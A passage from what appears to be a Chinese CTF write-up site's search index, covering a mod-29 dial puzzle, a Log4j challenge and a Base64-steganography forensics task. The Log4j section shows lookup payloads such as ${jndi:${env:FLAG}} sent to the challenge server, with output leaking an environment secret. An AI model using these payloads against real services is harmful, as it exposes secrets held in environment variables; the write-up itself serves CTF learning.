wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 Hey, could you help us? It's dark in here. The flag is of the form UACTF{the minimum amount of turns required per dial for the check to be successful.} There is a custom character encoding to convert the number of turns for each dial to the character representation. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 0 -> A 1 -> B 2 -> C 3 -> D 4 -> E 5 -> F 6 -> G 7 -> H 8 -> I 9 -> J 10 -> K 11 -> L 12 -> M 13 -> N 14 -> O 15 -> P 16 -> Q 17 -> R 18 -> S 19 -> T 20 -> U 21 -> V 22 -> W 23 -> X 24 -> Y 25 -> Z 26 -> _ 27 -> ! 28 -> * For example: 1 2 3 4 0 Turns to dial 1 13 Turns to Dial 2 etc... UACTF{0 13 10 11 8 3 4 9} UACTF{ANKLIDEJ} lighthouse.zip \u89e3\u9898\u601d\u8def \u00b6 index.html \u6709 \\(8\\) \u4e2a\u8f6c\u76d8\uff0c\u70b9\u51fb\u4efb\u610f\u8f6c\u76d8\u4f1a\u6539\u53d8\u6240\u6709\u8f6c\u76d8\u6307\u5411\u7684\u6570\u5b57\uff0c\u6c42\u6ee1\u8db3\u8981\u6c42\u6bcf\u4e2a\u8f6c\u76d8\u6700\u5c11\u70b9\u51fb\u7684\u6b21\u6570 setup.js \u6307\u51fa\u6bcf\u4e2a\u8f6c\u76d8\u4e3a\u901a\u8fc7\u68c0\u67e5\u5e94\u6307\u5411\u7684\u6570\u5b57\u4e3a 8, 11, 22, 4, 14, 26, 3, 21 \uff0c ki.js \u5206\u522b\u5bf9\u5e94\u6bcf\u4e2a\u8f6c\u76d8\u70b9\u51fb\u540e\u5bf9\u81ea\u5df1\u53ca\u5176\u5b83\u8f6c\u76d8\u7684\u5f71\u54cd\uff0c\u5176\u4e2d k2.js \u7ed9\u51fa\u4e86\u6bcf\u4e2a\u8f6c\u76d8\u521d\u59cb\u6307\u5411\u7684\u6570\u5b57 \u7c7b\u4f3c \u706f\uff0c\u7b49\u706f\u7b49\u706f - Level 0 \uff0c\u89e3\u4e00\u4e2a\u6a21 \\(29\\) \u7684\u7ebf\u6027\u65b9\u7a0b\u7ec4 \u77e9\u9635\u4e58\u6cd5\u7684\u7ed3\u679c\u77e9\u9635\u7b2c \\(i\\) \u884c\u7b2c \\(j\\) \u5217\u5143\u7d20\u7b49\u4e8e\u524d\u4e00\u4e2a\u77e9\u9635\u7b2c \\(i\\) \u884c\u5143\u7d20\u548c\u540e\u4e00\u77e9\u9635\u7b2c \\(j\\) \u5217\u76f8\u5e94\u5143\u7d20\u4e58\u79ef\u7684\u548c\uff0c\u56e0\u800c\u77e9\u9635\u4e58\u6cd5\u7684\u524d\u540e\u987a\u5e8f\u5f88\u91cd\u8981 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import numpy as np N , F = 8 , Zmod ( 29 ) k = [ [ 1 , 6 , 28 , 40 , 16 , 42 , 46 , 37 ], [ 46 , 1 , 14 , 25 , 44 , 17 , 27 , 27 ], [ 48 , 30 , 1 , 47 , 46 , 27 , 20 , 25 ], [ 40 , 11 , 16 , 1 , 50 , 12 , 27 , 26 ], [ 48 , 49 , 26 , 16 , 1 , 6 , 16 , 2 ], [ 11 , 9 , 13 , 3 , 11 , 1 , 10 , 35 ], [ 19 , 34 , 23 , 10 , 31 , 27 , 1 , 32 ], [ 12 , 10 , 36 , 6 , 19 , 24 , 8 , 1 ] ] init = [ 18 , 12 , 4 , 8 , 17 , 2 , 15 , 8 ] target = [ 8 , 11 , 22 , 4 , 14 , 26 , 3 , 21 ] L = Matrix ( F , N , N ) for i in range ( N ): for j in range ( N ): L [ i , j ] = k [ i ][ j ] d = [ chr ( ord ( 'A' ) + i ) for i in range ( 26 )] d . extend ([ '_' , '!' , '*' ]) # use A.solve_left(Y) to solve for X in XA = Y for i in L . solve_left ( vector ( F , np . subtract ( target , init ))): print ( d [ i ], end = '' ) \u4e5f\u53ef\u4ee5\u4f7f\u7528 Modular Arithmetic Solver - Congruence Calculator - Online \u6765\u89e3 =\u03c9= Flag \u00b6 UACTF{Y_Z*MB!E} \u53c2\u8003\u8d44\u6599 \u00b6 Base class for matrices, part 2 \u2014 Matrices and Spaces of Matrices","title":"Lighthouse"},{"location":"misc/lighthouse/#_1","text":"Hey, could you help us? It's dark in here. The flag is of the form UACTF{the minimum amount of turns required per dial for the check to be successful.} There is a custom character encoding to convert the number of turns for each dial to the character representation. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 0 -> A 1 -> B 2 -> C 3 -> D 4 -> E 5 -> F 6 -> G 7 -> H 8 -> I 9 -> J 10 -> K 11 -> L 12 -> M 13 -> N 14 -> O 15 -> P 16 -> Q 17 -> R 18 -> S 19 -> T 20 -> U 21 -> V 22 -> W 23 -> X 24 -> Y 25 -> Z 26 -> _ 27 -> ! 28 -> * For example: 1 2 3 4 0 Turns to dial 1 13 Turns to Dial 2 etc... UACTF{0 13 10 11 8 3 4 9} UACTF{ANKLIDEJ} lighthouse.zip","title":"\u9898\u76ee"},{"location":"misc/lighthouse/#_2","text":"index.html \u6709 \\(8\\) \u4e2a\u8f6c\u76d8\uff0c\u70b9\u51fb\u4efb\u610f\u8f6c\u76d8\u4f1a\u6539\u53d8\u6240\u6709\u8f6c\u76d8\u6307\u5411\u7684\u6570\u5b57\uff0c\u6c42\u6ee1\u8db3\u8981\u6c42\u6bcf\u4e2a\u8f6c\u76d8\u6700\u5c11\u70b9\u51fb\u7684\u6b21\u6570 setup.js \u6307\u51fa\u6bcf\u4e2a\u8f6c\u76d8\u4e3a\u901a\u8fc7\u68c0\u67e5\u5e94\u6307\u5411\u7684\u6570\u5b57\u4e3a 8, 11, 22, 4, 14, 26, 3, 21 \uff0c ki.js \u5206\u522b\u5bf9\u5e94\u6bcf\u4e2a\u8f6c\u76d8\u70b9\u51fb\u540e\u5bf9\u81ea\u5df1\u53ca\u5176\u5b83\u8f6c\u76d8\u7684\u5f71\u54cd\uff0c\u5176\u4e2d k2.js \u7ed9\u51fa\u4e86\u6bcf\u4e2a\u8f6c\u76d8\u521d\u59cb\u6307\u5411\u7684\u6570\u5b57 \u7c7b\u4f3c \u706f\uff0c\u7b49\u706f\u7b49\u706f - Level 0 \uff0c\u89e3\u4e00\u4e2a\u6a21 \\(29\\) \u7684\u7ebf\u6027\u65b9\u7a0b\u7ec4 \u77e9\u9635\u4e58\u6cd5\u7684\u7ed3\u679c\u77e9\u9635\u7b2c \\(i\\) \u884c\u7b2c \\(j\\) \u5217\u5143\u7d20\u7b49\u4e8e\u524d\u4e00\u4e2a\u77e9\u9635\u7b2c \\(i\\) \u884c\u5143\u7d20\u548c\u540e\u4e00\u77e9\u9635\u7b2c \\(j\\) \u5217\u76f8\u5e94\u5143\u7d20\u4e58\u79ef\u7684\u548c\uff0c\u56e0\u800c\u77e9\u9635\u4e58\u6cd5\u7684\u524d\u540e\u987a\u5e8f\u5f88\u91cd\u8981 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import numpy as np N , F = 8 , Zmod ( 29 ) k = [ [ 1 , 6 , 28 , 40 , 16 , 42 , 46 , 37 ], [ 46 , 1 , 14 , 25 , 44 , 17 , 27 , 27 ], [ 48 , 30 , 1 , 47 , 46 , 27 , 20 , 25 ], [ 40 , 11 , 16 , 1 , 50 , 12 , 27 , 26 ], [ 48 , 49 , 26 , 16 , 1 , 6 , 16 , 2 ], [ 11 , 9 , 13 , 3 , 11 , 1 , 10 , 35 ], [ 19 , 34 , 23 , 10 , 31 , 27 , 1 , 32 ], [ 12 , 10 , 36 , 6 , 19 , 24 , 8 , 1 ] ] init = [ 18 , 12 , 4 , 8 , 17 , 2 , 15 , 8 ] target = [ 8 , 11 , 22 , 4 , 14 , 26 , 3 , 21 ] L = Matrix ( F , N , N ) for i in range ( N ): for j in range ( N ): L [ i , j ] = k [ i ][ j ] d = [ chr ( ord ( 'A' ) + i ) for i in range ( 26 )] d . extend ([ '_' , '!' , '*' ]) # use A.solve_left(Y) to solve for X in XA = Y for i in L . solve_left ( vector ( F , np . subtract ( target , init ))): print ( d [ i ], end = '' ) \u4e5f\u53ef\u4ee5\u4f7f\u7528 Modular Arithmetic Solver - Congruence Calculator - Online \u6765\u89e3 =\u03c9=","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/lighthouse/#flag","text":"UACTF{Y_Z*MB!E}","title":"Flag"},{"location":"misc/lighthouse/#_3","text":"Base class for matrices, part 2 \u2014 Matrices and Spaces of Matrices","title":"\u53c2\u8003\u8d44\u6599"},{"location":"misc/log4_sanity_check/","text":"\u9898\u76ee \u00b6 ALARM ALARM nc 65.108.176.77 1337 \u89e3\u9898\u601d\u8def \u00b6 \u6070\u9022\u8fd1\u671f\u5728\u4fee\u8865 Log4j \u76f8\u5173\u7684\u6f0f\u6d1e\uff08CVE-2021-44228\uff09 \u03a3\u03a3\u03a3(\u03a6 \u03c9\u03a6||\u00a1) Log4j \u9664\u4e86\u80fd\u591f\u8bb0\u5f55\u6587\u672c\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u7b80\u5355\u8868\u8fbe\u5f0f\u8bb0\u5f55\u52a8\u6001\u5185\u5bb9\uff0c Log4j \u2013 Log4j 2 Lookups \u4f7f\u7528 Java Decompiler \u67e5\u770b Vuln.class \u4ee3\u7801\u3002\u6ce8\u610f\u5230\u5f53\u8f93\u5165\u4e0d\u5305\u542b dragon \u6216 hxp \u65f6\uff0c\u4f1a\u4f7f\u7528\u5230 logger \uff0c\u4e3a\u6f0f\u6d1e\u70b9 \u53ea\u6709\u6267\u884c\u5f02\u5e38\u65f6\u624d\u4f1a\u89e6\u53d1 System.err.println(exception) \uff0c\u770b\u5230 Lookups \u89e3\u6790\u540e\u7684\u7ed3\u679c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import java.util.Scanner ; import org.apache.logging.log4j.LogManager ; import org.apache.logging.log4j.Logger ; public class Vuln { public static void main ( String [] paramArrayOfString ) { try { Logger logger = LogManager . getLogger ( Vuln . class ); System . out . println ( \"What is your favourite CTF?\" ); String str = ( new Scanner ( System . in )). next (); if ( str . toLowerCase (). contains ( \"dragon\" )) { System . out . println ( \"<3\" ); System . exit ( 0 ); } if ( str . toLowerCase (). contains ( \"hxp\" )) { System . out . println ( \":)\" ); } else { System . out . println ( \":(\" ); logger . error ( \"Wrong answer: {}\" , str ); } } catch ( Exception exception ) { System . err . println ( exception ); } } } \u90a3\u4e48 Flag \u5728\u54ea\u91cc\u5462\uff1f\u770b\u770b Dockerfile \uff0c\u53d1\u73b0 Flag \u5df2\u7ecf\u5199\u5230\u73af\u5883\u53d8\u91cf\u91cc\u4e86\uff01 1 CMD ynetd -np y -lm -1 -lpid 64 -lt 10 -t 30 \"FLAG=' $( cat /flag.txt ) ' /home/ctf/run.sh\" \u90a3\u4e48\u63a5\u4e0b\u6765\u5c31\u5f88\u7b80\u5355\u4e86~ \u9996\u5148\uff0c\u9700\u8981\u4f7f\u7528 Environment Lookup \u53d6\u5f97\u73af\u5883\u53d8\u91cf\u4e2d\u7684 Flag\uff1a ${env:FLAG} \u4e3a\u4e86\u89e6\u53d1\u5f02\u5e38\uff0c\u518d\u628a Environment Lookup \u5d4c\u5957\u5230\u5176\u5b83\u67e5\u627e\u5931\u8d25\u4f1a\u89e6\u53d1\u5f02\u5e38\u7684 Lookups\uff0c\u5982 java \u3001 jndi 1 2 3 4 5 6 7 8 9 10 11 12 $ nc 65 .108.176.77 1337 What is your favourite CTF? ${ jndi : ${ env : FLAG }} : ( 2021 -12-20 03 :18:44,730 main WARN Error looking up JNDI resource [ hxp { Phew, I am glad I code everything in PHP anyhow : ) - : ( : ( : (}] . javax.naming.NoInitialContextException: Need to specify class name in environment or system property, or in an application resource file: java.naming.factory.initial ... $ nc 65 .108.176.77 1337 What is your favourite CTF? ${ java : ${ env : FLAG }} : ( 2021 -12-20 08 :10:40,151 main ERROR An exception occurred processing Appender Console java.lang.IllegalArgumentException: hxp { Phew, I am glad I code everything in PHP anyhow : ) - : ( : ( : (} ...","title":"Log 4 sanity check"},{"location":"misc/log4_sanity_check/#_1","text":"ALARM ALARM nc 65.108.176.77 1337","title":"\u9898\u76ee"},{"location":"misc/log4_sanity_check/#_2","text":"\u6070\u9022\u8fd1\u671f\u5728\u4fee\u8865 Log4j \u76f8\u5173\u7684\u6f0f\u6d1e\uff08CVE-2021-44228\uff09 \u03a3\u03a3\u03a3(\u03a6 \u03c9\u03a6||\u00a1) Log4j \u9664\u4e86\u80fd\u591f\u8bb0\u5f55\u6587\u672c\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u7b80\u5355\u8868\u8fbe\u5f0f\u8bb0\u5f55\u52a8\u6001\u5185\u5bb9\uff0c Log4j \u2013 Log4j 2 Lookups \u4f7f\u7528 Java Decompiler \u67e5\u770b Vuln.class \u4ee3\u7801\u3002\u6ce8\u610f\u5230\u5f53\u8f93\u5165\u4e0d\u5305\u542b dragon \u6216 hxp \u65f6\uff0c\u4f1a\u4f7f\u7528\u5230 logger \uff0c\u4e3a\u6f0f\u6d1e\u70b9 \u53ea\u6709\u6267\u884c\u5f02\u5e38\u65f6\u624d\u4f1a\u89e6\u53d1 System.err.println(exception) \uff0c\u770b\u5230 Lookups \u89e3\u6790\u540e\u7684\u7ed3\u679c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import java.util.Scanner ; import org.apache.logging.log4j.LogManager ; import org.apache.logging.log4j.Logger ; public class Vuln { public static void main ( String [] paramArrayOfString ) { try { Logger logger = LogManager . getLogger ( Vuln . class ); System . out . println ( \"What is your favourite CTF?\" ); String str = ( new Scanner ( System . in )). next (); if ( str . toLowerCase (). contains ( \"dragon\" )) { System . out . println ( \"<3\" ); System . exit ( 0 ); } if ( str . toLowerCase (). contains ( \"hxp\" )) { System . out . println ( \":)\" ); } else { System . out . println ( \":(\" ); logger . error ( \"Wrong answer: {}\" , str ); } } catch ( Exception exception ) { System . err . println ( exception ); } } } \u90a3\u4e48 Flag \u5728\u54ea\u91cc\u5462\uff1f\u770b\u770b Dockerfile \uff0c\u53d1\u73b0 Flag \u5df2\u7ecf\u5199\u5230\u73af\u5883\u53d8\u91cf\u91cc\u4e86\uff01 1 CMD ynetd -np y -lm -1 -lpid 64 -lt 10 -t 30 \"FLAG=' $( cat /flag.txt ) ' /home/ctf/run.sh\" \u90a3\u4e48\u63a5\u4e0b\u6765\u5c31\u5f88\u7b80\u5355\u4e86~ \u9996\u5148\uff0c\u9700\u8981\u4f7f\u7528 Environment Lookup \u53d6\u5f97\u73af\u5883\u53d8\u91cf\u4e2d\u7684 Flag\uff1a ${env:FLAG} \u4e3a\u4e86\u89e6\u53d1\u5f02\u5e38\uff0c\u518d\u628a Environment Lookup \u5d4c\u5957\u5230\u5176\u5b83\u67e5\u627e\u5931\u8d25\u4f1a\u89e6\u53d1\u5f02\u5e38\u7684 Lookups\uff0c\u5982 java \u3001 jndi 1 2 3 4 5 6 7 8 9 10 11 12 $ nc 65 .108.176.77 1337 What is your favourite CTF? ${ jndi : ${ env : FLAG }} : ( 2021 -12-20 03 :18:44,730 main WARN Error looking up JNDI resource [ hxp { Phew, I am glad I code everything in PHP anyhow : ) - : ( : ( : (}] . javax.naming.NoInitialContextException: Need to specify class name in environment or system property, or in an application resource file: java.naming.factory.initial ... $ nc 65 .108.176.77 1337 What is your favourite CTF? ${ java : ${ env : FLAG }} : ( 2021 -12-20 08 :10:40,151 main ERROR An exception occurred processing Appender Console java.lang.IllegalArgumentException: hxp { Phew, I am glad I code everything in PHP anyhow : ) - : ( : ( : (} ...","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/newsctf_all_reverse/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u4e0b\u8f7d piz.galf \uff0c\u89e3\u538b\u540e\u91cc\u9762\u662f flag1.pcapng \uff08\u55ef\uff0c\u770b\u6765\u9664\u4e86\u6587\u4ef6\u540d\u662f\u53cd\u8fc7\u6765\u7684\u4ee5\u5916\u597d\u50cf\u8fd8\u633a\u6b63\u5e38\u7684\u2026\uff09 \u67e5\u770b\u6d41\u91cf\u5305\uff0c\u53d1\u73b0\u51e0\u4e2a\u53ef\u7591\u7684 HTTP \u6d41\u91cf\uff0c\u83b7\u53d6 piz \uff08\u5373 ZIP\uff09\u6587\u4ef6 \u5bfc\u51fa piz HTTP \u5bf9\u8c61\uff0c\u5171\u4e09\u4e2a\uff0c\u5176\u4e2d\u6709\u4e00\u4e2a HTML \u6587\u4ef6\uff08\u7f51\u9875\u4e2d\u5305\u542b\u63d0\u793a\u4fe1\u606f\uff1aYou don't have the permission to access the requested resource. It is either read-protected or not readable by the server.\uff09\uff0c\u53e6\u5916\u4e24\u4e2a\u6587\u4ef6\u7c7b\u578b\u4e0d\u660e\u4f46\u5185\u5bb9\u4e00\u81f4 \u4f7f\u7528 010 Editor \u67e5\u770b\u7c7b\u578b\u4e0d\u660e\u7684\u6587\u4ef6\uff0c\u53d1\u73b0\u662f\u6309\u5b57\u8282\u9006\u5e8f\u7684 RAR \u6587\u4ef6 \u6309\u5b57\u8282\u9006\u5e8f\u540e\u83b7\u5f97\u4e00\u4e2a\u52a0\u5bc6\u7684 RAR \u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a flag.txt \u6587\u4ef6 \u518d\u56de\u5230\u6d41\u91cf\u5305\uff0c\u5927\u91cf\u7684 POST \u8bf7\u6c42\u975e\u5e38\u53ef\u7591\uff0c\u67e5\u770b\u4efb\u610f\u4e00\u4e2a POST \u8bf7\u6c42\uff0c\u5176\u4e2d\u5305\u542b\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u8868\u5355\u6570\u636e\uff0c\u63a8\u6d4b\u4e0e\u538b\u7f29\u5305\u5bc6\u7801\u6709\u5173 \u6ce8\u610f\u5230\u6709\u4e00\u4e2a /logout \u8bf7\u6c42\uff0c\u8bf4\u660e\u5728\u6b64\u4e4b\u524d\u4e00\u5b9a\u6709\u4e00\u6b21\u6210\u529f\u7684\u767b\u5165\uff0c\u7f29\u5c0f\u68c0\u7d22\u8303\u56f4 \u5982\u679c\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\uff0c\u5c06\u8fd4\u56de 403 FORBIDDEN \uff0c\u4ee5\u6b64\u4e3a\u4f9d\u636e\u67e5\u627e\u6b63\u786e\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002\u6700\u7ec8\u83b7\u5f97\u6b63\u786e\u7528\u6237\u540d test123 \u548c\u5bc6\u7801 passwd123 \u4f7f\u7528 passwd123 \u53ef\u89e3\u538b\u52a0\u5bc6\u7684 RAR \u6587\u4ef6\u5e76\u83b7\u5f97 flag.txt \uff0c\u5185\u5bb9\u663e\u7136\u662f\u7ecf\u8fc7 Base64 \u7f16\u7801\u540e\u5012\u5e8f\u7684\u6587\u672c 1 2 3 4 5 6 # \u5185\u5bb9\u8282\u9009 ... == cnAKuLm9GIr5WaoRHIvRHI5RXdhVmYgg2Y11GIuVGdm9GI09mbgMXYoBibh12b3BSYgwyclNXYjBCajV3cg4WScCo4 lhGIuVGa3BSelx2ZulmQg4icNBSZlNHIk5WYg82ZgQWZlRmbpBCdzVXbgU3b5BCLyFWZkBSetBCL0VnQcCo4 = 0Jgi7CZv9GayV3bih2ZpVmbgUGa0Byb05WagMXZt92Y ... \u5c06\u6587\u672c\u5404\u884c\u6309\u5b57\u7b26\u9006\u5e8f\u518d Base64 \u89e3\u7801\uff0c\u53ef\u83b7\u5f97\u300a\u50b2\u6162\u4e0e\u504f\u89c1\u300b\u4e00\u5927\u6bb5\u8282\u9009\uff0c\u6ca1\u6709\u76f4\u63a5\u7684 Flag \u4fe1\u606f\uff0c\u53ea\u6709\u4e00\u4e9b\u4e0e\u539f\u6587\u6709\u5dee\u5f02\u7684\u5b57\u7b26\u4ee5\u53ca\u770b\u7740\u50cf\u89e3\u7801\u5931\u8d25\u7684\u5b57\u7b26 (\u014f\u03c9\u014f) \u6709\u70b9\u5947\u602a\uff0c\u96be\u9053 Flag \u662f\u7531\u4e0e\u539f\u6587\u6709\u5dee\u5f02\u7684\u5b57\u7b26\u7ec4\u6210\u7684\u4e48\uff1f\u3010\u53ef\u80fd\u6027\u4e0d\u5927\u2026 1 2 3 4 5 6 7 8 # \u89e3\u7801\u6587\u672c\u8282\u9009 ... \u00e2\u0080\u009cMy dear Mr. Zennet,\u00e2\u0080\u009d said his lady to him one day, \u00e2\u0080\u009chave you hearg that Netherfield \\a rk is let at last?\u00e2\u0080\u009d Mr. Bennet replied that he had not. \u00e2\u0080\u009cBut it is,\u00e2\u0080\u009d returned she ; \u00e2\u0080\u009cfor Mrs. Long has just been here, and she told me all about it.\u00e2\u0080\u009d ... \u5176\u5b9e\u662f Base64 \u9690\u5199 XD \u63d0\u53d6\u7684\u5185\u5bb9\u4e3a\uff1a flag{md5(0)} \u8ba1\u7b97 0 \u7684 MD5 \u54c8\u5e0c\u503c\u5373\u53ef\u83b7\u5f97 Flag Base64 \u9690\u5199 \u00b6 Base64 \u7f16\u7801\u5373\u5c06\u6587\u672c\u5b57\u7b26\u5bf9\u5e94\u6210\u4e8c\u8fdb\u5236\u540e\uff0c\u518d\u6bcf 6 \u4e2a\u6bd4\u7279\u4e3a\u4e00\u7ec4\u8f6c\u6362\u4e3a\u53ef\u6253\u5370\u5b57\u7b26\u3002\u82e5\u7f16\u7801\u7684\u5b57\u8282\u6570\u4e0d\u662f 3 \u7684\u500d\u6570\uff0c\u5219\u5148\u4f7f\u7528 0 \u5b57\u8282\u5728\u672b\u5c3e\u8865\u8db3\uff0c\u518d\u8fdb\u884c\u7f16\u7801\uff0c\u5e76\u5728\u7f16\u7801\u7684\u6587\u672c\u540e\u6dfb\u52a0\u4e00\u4e2a\uff08\u5f85\u7f16\u7801\u5b57\u8282\u6570\u6a21 3 \u4f59 2\uff09\u6216\u4e24\u4e2a\uff08\u5f85\u7f16\u7801\u5b57\u8282\u6570\u6a21 3 \u4f59 1\uff09\u7b49\u53f7 .tg {border-collapse:collapse;border-spacing:0;} .tg td th{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;font-weight:normal; overflow:hidden;padding:10px 5px;word-break:normal;} .tg .tg-lboi{border-color:inherit;text-align:left;vertical-align:middle} .tg .tg-kaq8{border-color:inherit;color:#fe0000;font-weight:bold;text-align:left;} .tg .tg-uzvj{border-color:inherit;font-weight:bold;text-align:center;} .tg .tg-fymr{border-color:inherit;font-weight:bold;text-align:left;} \u6587\u672c\uff081 Byte\uff09 A \u4e8c\u8fdb\u5236\u4f4d 0 1 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \u4e8c\u8fdb\u5236\u4f4d\uff08\u88650\uff09 0 1 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 Base64\u7f16\u7801 Q Q = = \u6587\u672c\uff082 Byte\uff09 B C \u4e8c\u8fdb\u5236\u4f4d 0 1 0 0 0 0 1 0 0 1 0 0 0 0 1 1 0 0 0 0 0 0 0 0 \u4e8c\u8fdb\u5236\u4f4d\uff08\u88650\uff09 0 1 0 0 0 0 1 0 0 1 0 0 0 0 1 1 0 0 0 0 0 0 0 0 Base64\u7f16\u7801 Q k M = Base64 \u89e3\u7801\u5219\u9996\u5148\u4e22\u5f03\u586b\u5145\u7684\u7b49\u53f7\uff0c\u800c\u540e\u5c06\u7f16\u7801\u5b57\u7b26\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u6570\u6bcf 8 \u4e2a\u4e00\u7ec4\u8f6c\u5316\u4e3a ASCII \u7801\uff0c\u76f4\u5230\u5269\u4f59\u7684\u4e8c\u8fdb\u5236\u6570\u4e0d\u8db3 8 \u4f4d\u3002\u4e0a\u8868\u6807 \u7ea2 \u7684\u4e8c\u8fdb\u5236\u4f4d\u4e0d\u4f1a\u5f71\u54cd\u89e3\u7801\uff0c\u53ef\u7528\u4e8e\u9690\u5199 extract.py 1 2 3 4 5 6 7 8 9 10 11 12 13 #!/usr/bin/env python3 path = './stego.txt' b64char = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' with open ( path , 'r' ) as f : cipher = [ i . strip () for i in f . readlines ()] bstr = '' for l in cipher : if l [ - 2 :] == '==' : bstr += bin ( b64char . index ( l [ - 3 ]))[ 2 :] . zfill ( 8 )[ - 4 :] elif l [ - 1 :] == '=' : bstr += bin ( b64char . index ( l [ - 2 ]))[ 2 :] . zfill ( 8 )[ - 2 :] print ( '' . join ([ chr ( int ( bstr [ i : i + 8 ], 2 )) for i in range ( 0 , len ( bstr ), 8 )]))","title":"NEWSCTF - \uff01\u4e86\u53cd\u90fd\uff0c\u4e86\u53cd"},{"location":"misc/newsctf_all_reverse/#_1","text":"\u4e0b\u8f7d piz.galf \uff0c\u89e3\u538b\u540e\u91cc\u9762\u662f flag1.pcapng \uff08\u55ef\uff0c\u770b\u6765\u9664\u4e86\u6587\u4ef6\u540d\u662f\u53cd\u8fc7\u6765\u7684\u4ee5\u5916\u597d\u50cf\u8fd8\u633a\u6b63\u5e38\u7684\u2026\uff09 \u67e5\u770b\u6d41\u91cf\u5305\uff0c\u53d1\u73b0\u51e0\u4e2a\u53ef\u7591\u7684 HTTP \u6d41\u91cf\uff0c\u83b7\u53d6 piz \uff08\u5373 ZIP\uff09\u6587\u4ef6 \u5bfc\u51fa piz HTTP \u5bf9\u8c61\uff0c\u5171\u4e09\u4e2a\uff0c\u5176\u4e2d\u6709\u4e00\u4e2a HTML \u6587\u4ef6\uff08\u7f51\u9875\u4e2d\u5305\u542b\u63d0\u793a\u4fe1\u606f\uff1aYou don't have the permission to access the requested resource. It is either read-protected or not readable by the server.\uff09\uff0c\u53e6\u5916\u4e24\u4e2a\u6587\u4ef6\u7c7b\u578b\u4e0d\u660e\u4f46\u5185\u5bb9\u4e00\u81f4 \u4f7f\u7528 010 Editor \u67e5\u770b\u7c7b\u578b\u4e0d\u660e\u7684\u6587\u4ef6\uff0c\u53d1\u73b0\u662f\u6309\u5b57\u8282\u9006\u5e8f\u7684 RAR \u6587\u4ef6 \u6309\u5b57\u8282\u9006\u5e8f\u540e\u83b7\u5f97\u4e00\u4e2a\u52a0\u5bc6\u7684 RAR \u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a flag.txt \u6587\u4ef6 \u518d\u56de\u5230\u6d41\u91cf\u5305\uff0c\u5927\u91cf\u7684 POST \u8bf7\u6c42\u975e\u5e38\u53ef\u7591\uff0c\u67e5\u770b\u4efb\u610f\u4e00\u4e2a POST \u8bf7\u6c42\uff0c\u5176\u4e2d\u5305\u542b\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u8868\u5355\u6570\u636e\uff0c\u63a8\u6d4b\u4e0e\u538b\u7f29\u5305\u5bc6\u7801\u6709\u5173 \u6ce8\u610f\u5230\u6709\u4e00\u4e2a /logout \u8bf7\u6c42\uff0c\u8bf4\u660e\u5728\u6b64\u4e4b\u524d\u4e00\u5b9a\u6709\u4e00\u6b21\u6210\u529f\u7684\u767b\u5165\uff0c\u7f29\u5c0f\u68c0\u7d22\u8303\u56f4 \u5982\u679c\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\uff0c\u5c06\u8fd4\u56de 403 FORBIDDEN \uff0c\u4ee5\u6b64\u4e3a\u4f9d\u636e\u67e5\u627e\u6b63\u786e\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002\u6700\u7ec8\u83b7\u5f97\u6b63\u786e\u7528\u6237\u540d test123 \u548c\u5bc6\u7801 passwd123 \u4f7f\u7528 passwd123 \u53ef\u89e3\u538b\u52a0\u5bc6\u7684 RAR \u6587\u4ef6\u5e76\u83b7\u5f97 flag.txt \uff0c\u5185\u5bb9\u663e\u7136\u662f\u7ecf\u8fc7 Base64 \u7f16\u7801\u540e\u5012\u5e8f\u7684\u6587\u672c 1 2 3 4 5 6 # \u5185\u5bb9\u8282\u9009 ... == cnAKuLm9GIr5WaoRHIvRHI5RXdhVmYgg2Y11GIuVGdm9GI09mbgMXYoBibh12b3BSYgwyclNXYjBCajV3cg4WScCo4 lhGIuVGa3BSelx2ZulmQg4icNBSZlNHIk5WYg82ZgQWZlRmbpBCdzVXbgU3b5BCLyFWZkBSetBCL0VnQcCo4 = 0Jgi7CZv9GayV3bih2ZpVmbgUGa0Byb05WagMXZt92Y ... \u5c06\u6587\u672c\u5404\u884c\u6309\u5b57\u7b26\u9006\u5e8f\u518d Base64 \u89e3\u7801\uff0c\u53ef\u83b7\u5f97\u300a\u50b2\u6162\u4e0e\u504f\u89c1\u300b\u4e00\u5927\u6bb5\u8282\u9009\uff0c\u6ca1\u6709\u76f4\u63a5\u7684 Flag \u4fe1\u606f\uff0c\u53ea\u6709\u4e00\u4e9b\u4e0e\u539f\u6587\u6709\u5dee\u5f02\u7684\u5b57\u7b26\u4ee5\u53ca\u770b\u7740\u50cf\u89e3\u7801\u5931\u8d25\u7684\u5b57\u7b26 (\u014f\u03c9\u014f) \u6709\u70b9\u5947\u602a\uff0c\u96be\u9053 Flag 